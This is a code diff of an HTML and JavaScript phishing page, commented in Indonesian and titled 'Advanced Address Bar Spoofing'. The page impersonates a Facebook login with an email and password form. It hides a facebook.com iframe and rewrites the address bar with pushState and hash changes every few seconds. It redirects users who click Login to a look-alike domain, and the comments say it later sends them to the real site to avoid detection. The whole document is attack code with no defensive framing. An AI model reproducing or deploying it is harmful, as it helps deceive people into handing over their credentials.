@@ -1,57 +1,66 @@
 <html>
 <head>
-    <title>Address Bar Spoofing Brave</title>
+    <title>Advanced Address Bar Spoofing</title>
     <style>
-        /* Gaya untuk menyembunyikan iframe yang berisi URL asli */
+        /* Sembunyikan iframe agar pengguna tidak melihatnya */
         iframe {
             position: absolute;
             top: -9999px;
             left: -9999px;
             width: 0;
             height: 0;
-            border: 0;
+            border: none;
         }
     </style>
 </head>
 <body>
     <h1>Welcome to Fakebook</h1>
-    <form>
+    <form id="loginForm">
         Email: <input type="text" name="username" placeholder="Enter email"><br>
         Password: <input type="password" name="password" placeholder="Enter password">
+        <button id="submitBtn">Login</button>
     </form>
 
-    <!-- Iframe menuju URL asli -->
-    <iframe id="realFacebook" src="https://facebook.com"></iframe>
+    <iframe id="iframeRealSite" src="https://facebook.com"></iframe>
 
     <script>
-        // Fungsi untuk memanipulasi URL di address bar menggunakan pushState dan location.hash
+        // Fungsi untuk memanipulasi address bar dengan history.pushState dan redirect dinamis
         function spoofAddressBar() {
-            // Ganti URL menggunakan pushState
-            history.pushState({}, "Fake Facebook", "/login.php");
-            // Ganti hash untuk menambah kesan legitimasi
-            location.hash = "facebook.com/login";
+            // Manipulasi URL tanpa reload halaman
+            history.pushState({}, "Fakebook Login", "/login.php");
+            location.hash = "#facebook.com/login";
         }
 
-        // Pengalihan alamat halaman asli dengan iframe tersembunyi
-        function createIllusion() {
-            // Setiap 5 detik, ganti URL di address bar dengan yang palsu
-            setInterval(function() {
-                spoofAddressBar();
-            }, 5000);
-        }
+        // Mengalihkan ke halaman phishing setelah interaksi pengguna
+        document.getElementById('submitBtn').addEventListener('click', function(event) {
+            event.preventDefault();  // Mencegah form dari submit
 
-        // Fungsi untuk pengalihan cepat kembali ke halaman asli menggunakan iframe
-        function redirectToRealFacebook() {
-            // Ubah window.location ke halaman Facebook asli setelah beberapa saat
+            // Pengalihan ke situs phishing saat pengguna mengklik Login
             setTimeout(function() {
-                location = "https://facebook.com";
-            }, 20000); // Pengalihan ke halaman asli setelah 20 detik (misal, memberi waktu user untuk input data palsu)
+                window.location.href = "https://fakebook.com";
+            }, 100);  // Pengalihan cepat untuk mengelabui pengguna
+        });
+
+        // Manipulasi iframe untuk membuat ilusi bahwa halaman asli sedang dibuka
+        function fakeInteraction() {
+            var iframe = document.getElementById('iframeRealSite');
+            var win = iframe.contentWindow;
+            // Kirim pesan melalui postMessage untuk mensimulasikan interaksi dengan halaman asli
+            win.postMessage("spoof", "https://facebook.com");
         }
 
-        // Jalankan fungsi spoofing dan pengalihan
-        createIllusion();
-        redirectToRealFacebook();
+        // Setiap 3 detik, update address bar untuk mempertahankan ilusi
+        setInterval(function() {
+            spoofAddressBar();
+        }, 3000);
 
+        // Jalankan pengalihan ke situs asli setelah spoof berjalan beberapa saat (untuk menghindari deteksi)
+        setTimeout(function() {
+            window.location.href = "https://facebook.com";
+        }, 20000);  // 20 detik untuk membuat pengguna berpikir bahwa mereka masih di halaman yang sama
+
+        // Jalankan fungsi interaksi palsu dengan iframe
+        fakeInteraction();
     </script>
 </body>
 </html>
